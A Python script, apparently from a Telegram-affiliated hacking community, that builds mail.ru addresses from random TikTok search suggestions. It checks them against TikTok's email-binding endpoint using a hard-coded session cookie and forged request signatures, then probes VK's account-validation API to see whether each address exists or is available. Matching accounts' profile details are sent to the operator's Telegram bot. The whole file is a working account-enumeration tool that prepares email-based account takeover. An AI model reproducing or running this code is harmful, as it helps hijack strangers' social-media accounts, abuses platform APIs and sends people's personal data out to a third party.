import requests,random
import secrets
import SignerPy,os
from requests import get,post as pp,Session;from urllib.parse import urlencode;import http.client,re,random,string,sys,time,uuid,binascii,json;from random import choice as cc,randrange as rr,randint;from time import sleep,time;from user_agent import generate_user_agent as ggb;import telebot;from telebot import types;from uuid import uuid4;import secrets;from datetime import datetime;from bs4 import BeautifulSoup;from ms4 import InfoTik;
import threading
from ms4 import InfoTik
token=input("Enter token • ")
id=input("Enter Id •:")
gt=0
bt=0
gm=0
bm=0
def info(email):
	email=email.split("@")[0]
	try:

		info=InfoTik.TikTok_Info(email)
		
		us=info["username"]
		name=info["name"]
		follo=info["followers"]
		follow=info["following"]
		lik=info["like"]
		date=info["Date"]
		co=info["country"]
		by=info["by"]
		
		
		ff=f'''
		===============
		User » {us}
		Name » {name}
		Email • {email}@mail.ru
		Followers » {follo}
		Following » {follow}
		Like » {lik}
		Date » {date}
		Country » {co}
		By » {by}
		def » @XEF_R
		===============
		'''
		tlg = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={ff}'
		print(ff)	
		i = requests.post(tlg)
	
	except:
		print("لا يوجد معلومات لليميل")
		ff=f'''
		Email • {email}@mail.ru
		def • @XEF_R
		'''
		tlg = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={ff}'
		print(ff)	
		i = requests.post(tlg)
def check_gg(email):
	global gt,bt,gm,bm
	cookies = {
	    'remixlang': '98',
	    'remixstlid': '9058935829008153565_PvHyIjSqpIOmjpgKGTEhyA0BGQHRNCx5yek7KCJzkr0',
	    'prcl': 'acc77eadc7da3b',
	    'remixuas': 'NTQyODUyNjZkNzBhN2U1OGVlNzM5ZmI1',
	    'remixstid': '910404140_J0jG6euooZZF3NK6TOzTKl4MtXhaHNXCVLJFzTFOlGX',
	    'remixuacck': '02a37bf66b07f20900',
	    'remixnreg_sid': '6f69eca9770981b9f83cf31f08dcb8ec',
	    'mail_act': '5c32db7a4e80fe0f87de2ce269c9ba8f',
	    'remixlns': '4f32e3501be8153690',
	}
	
	headers = {
	    'authority': 'api.vk.ru',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://id.vk.ru',
	    'referer': 'https://id.vk.ru/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'v': '5.258',
	    'client_id': '7539952',
	}
	
	data = {
	    'login': email,
	    'client_id': '7539952',
	    'device_id': 'wTC5eMX1SKhWo-z4WQjw1',
	    'supported_ways': 'push,email,codegen,sms,callreset,password,reserve_code,call_in,passkey,max_messenger,official_messenger,call_in,passkey,max_messenger,official_messenger',
	    'start_mailru_flow': '1',
	    'mail_token': 'AG_CmIJ9XOjC1xxfo8MJ6XUM01',
	    'oid': '2UZmBsRNHF38S3SFgz34q',
	    'save_auth': '1',
	    'platform': 'web',
	    'multiaccount_users': '',
	    'multiaccount_users_hash': '',
	    'code_challenge': 'MO-PQhle74gimLspVWyHaVZbOMABXF7aSsSResFhLJA',
	    'code_challenge_method': 'S256',
	    'anonymous_token': 'anonym.eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhbm9ueW1faWQiOjkxMDQwNDE0MCwiYXBwX2lkIjo3NTM5OTUyLCJpYXQiOjE3NjkzNjc0ODgsImlzX3ZlcmlmaWVkIjpmYWxzZSwiZXhwIjoxNzY5NDUzODg4LCJzaWduZWRfdGltZSI6bnVsbCwiYW5vbnltX2lkX2xvbmciOjkwNTg5MzU4MjkwMDgxNTM1NjV9._SUhMcKfcwmMwD0VegEDHxo9QyHxuvkJkjQQsgYhMl4',
	    'access_token': '',
	}
	
	rr = requests.post('https://api.vk.ru/method/auth.validateAccount', params=params, cookies=cookies, headers=headers, data=data)
	
	if 'response' in rr.json():
	    tt = rr.json()
	    if 'sid' in tt['response']:
	        gm+=1
	        os.system("clear")
	        print(f'''
Hits • {gm}  
Bad ma • {bm} 
Good tik • {gt}
Bad tik • {bt}
def • @YAALI_515
	        ''')
	        info(email)
	        
	    else:
	        bm+=1
	        os.system("clear")
	        print(f'''
Hits • {gm}  
Bad ma • {bm} 
Good tik • {gt}
Bad tik • {bt}
def • @YAALI_515
	        ''')
	        
	else:
	    bm+=1
	    os.system("clear")
	    print(f'''
Hits • {gm}  
Bad ma • {bm} 
Good tik • {gt}
Bad tik • {bt}
def • @YALI_515
	        ''')
	    
	    
	    
	    
def check_email(email):
	global gt,bt,gm,bm
	secret = secrets.token_hex(16)
	
	cookies = {
	            "passport_csrf_token": secret,
	            "passport_csrf_token_default": secret,
	            "sessionid":"e906f19d630edf802fdbca9c1aa7a2de"
	        }
	
	url = "https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"
	params = {
	            "request_tag_from": "h5",
	            "fixed_mix_mode": "1",
	            "mix_mode": "1",
	            "passport-sdk-version": "0",
	            "app_language": "en",
	            "scene": "4",
	            "device_platform": "android",
	            "os": "android",
	            "ssmix": "a",
	            "channel": "googleplay",
	            "aid": "1233",
	            "app_name": "musical_ly",
	            "version_code": "360505",
	            "version_name": "36.5.5",
	            "manifest_version_code": "2023605050",
	            "update_version_code": "2023605050",
	            "ab_version": "36.5.5",
	            "resolution": "1440*2969",
	            "dpi": "532",
	            "language": "EN",
	            "os_api": "34",
	            "os_version": "14",
	            "ac": "wifi",
	            "is_pad": "0",
	            "current_region": "US",
	            "app_type": "normal",
	            "sys_region": "US",
	            "last_install_time": "1729289943",
	            "mcc_mnc": "41820",
	            "timezone_name": "Asia/Baghdad",
	            "carrier_region_v2": "418",
	            "residence": "US",
	            "app_language": "en",
	            "carrier_region": "US",
	            "timezone_offset": "10800",
	            "host_abi": "arm64-v8a",
	            "locale": "ar",
	            "ac2": "wifi",
	            "uoo": "0",
	            "op_region": "US",
	            "build_number": "36.5.5",
	            "region": "US",
	            "support_webview": "1",
	            "cronet_version": "1c651b66_2024-08-30",
	            "ttnet_version": "4.2.195.8-tiktok",
	            "use_store_region_cookie": "1",
	              "device_id":str(random.randint(1, 10**19))
	}
	m=SignerPy.sign(params=params,cookie=cookies)
	headers = {
	            "sdk-version": "1",
	            "user-agent": "com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)",
	                       "x-argus": m["x-argus"],
	                "x-gorgon": m["x-gorgon"],
	                "x-khronos": m["x-khronos"],
	                "x-ladon": m["x-ladon"],
	        }
	
	data = {
	            "email": email,    
	        }
	        
	r=requests.post(url,headers=headers,params=params,data=data,cookies=cookies).text
	if "Email is linked to another account. Unlink or try another email." in r:
		gt+=1
		os.system("clear")
		print(f'''
Hits • {gm}  
Bad ma • {bm} 
Good tik • {gt}
Bad tik • {bt}
def • @YAALI_515
	        ''')
		check_email(email)
	elif 'Session expired. Log in to continue.' in r:
		print(" بداله من سطر157 سيشن عطلان")
		exit()
	else:
		bt+=1
		os.system("clear")
		print(r)
		print(f'''
Hits • {gm}  
Bad ma • {bm} 
Good tik • {gt}
Bad tik • {bt}
def • @YAALI_515
	        ''')
	        
			

	    
	    
	    
import requests,random
import threading
from threading import Thread
#هاذا تصال سيرچ بقه تصال فحص وفحص جيميل و معلومات وبسس باي 
def search():
	
	while True:
		se=''.join(random.choice("qwertyuiopasdfghjklzxcvbnm")for i in range(7))
		
		cookies = {
		    'tt_chain_token': 'hop0GKsdUmWiND04gDsgVA==',
		    'tiktok_webapp_theme_source': 'light',
		    'tiktok_webapp_theme': 'light',
		    'tt_csrf_token': '11UnTBBH-PV7eK4ksE8Muy8HnUJ8Aas-MaxA',
		    'perf_feed_cache': '{%22expireTimestamp%22:1768636800000%2C%22itemIds%22:[%227591956368890875157%22%2C%227592313273740037399%22]}',
		    'ttwid': '1%7CpY9b6BsCYd4cCyoF1-qKzNAaH48ex5LgS4p_dfYqdVQ%7C1768467428%7C0d48bd14add70b92fc51989406b1bbddc6b445233f3ec845ec847bf9d2240d6b',
		    'msToken': 'DAGFBbnk1jE26ZCvnf5dpKehh42vlc-MReNvqIBuMC9PlRitbijTbb1Y7yq6GFR7Esgm_T_9iUK56zotfpR8ZwZPEHIenN3-Evf6rFF9zKBBbLMusAav7PmiKlqk6nkrCWkl9XNj25me2A==',
		    'msToken': 'DAGFBbnk1jE26ZCvnf5dpKehh42vlc-MReNvqIBuMC9PlRitbijTbb1Y7yq6GFR7Esgm_T_9iUK56zotfpR8ZwZPEHIenN3-Evf6rFF9zKBBbLMusAav7PmiKlqk6nkrCWkl9XNj25me2A==',
		}
		
		headers = {
		    'authority': 'www.tiktok.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6',
		    'referer': 'https://www.tiktok.com/search',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
		}
		
		params = {
		    'WebIdLastTime': '1768464692',
		    'aid': '1988',
		    'app_language': 'ar',
		    'app_name': 'tiktok_web',
		    'browser_language': 'ar-EG',
		    'browser_name': 'Mozilla',
		    'browser_online': 'true',
		    'browser_platform': 'Linux armv81',
		    'browser_version': '5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
		    'channel': 'tiktok_web',
		    'cookie_enabled': 'true',
		    'data_collection_enabled': 'false',
		    'device_id': '7595498003848054293',
		    'device_platform': 'web_mobile',
		    'focus_state': 'true',
		    'from_page': 'search',
		    'history_len': '5',
		    'is_fullscreen': 'false',
		    'is_page_visible': 'true',
		    'keyword': se,
		    'os': 'android',
		    'priority_region': '',
		    'referer': 'https://www.google.com/',
		    'region': 'IQ',
		    'root_referer': 'https://www.google.com/',
		    'screen_height': '806',
		    'screen_width': '360',
		    'tz_name': 'Asia/Baghdad',
		    'user_is_login': 'false',
		    'webcast_language': 'ar',
		}
		
		response = requests.get('https://www.tiktok.com/api/search/general/sug/', params=params, cookies=cookies, headers=headers).json()
		m=0
		try:
			m+=1
			user=response["sug_list"][m]["content"]
			email=user+"@mail.ru"
			check_email(email)
		except:''
	
	
	
for i in range(15):
	Thread(target=search).start()	    
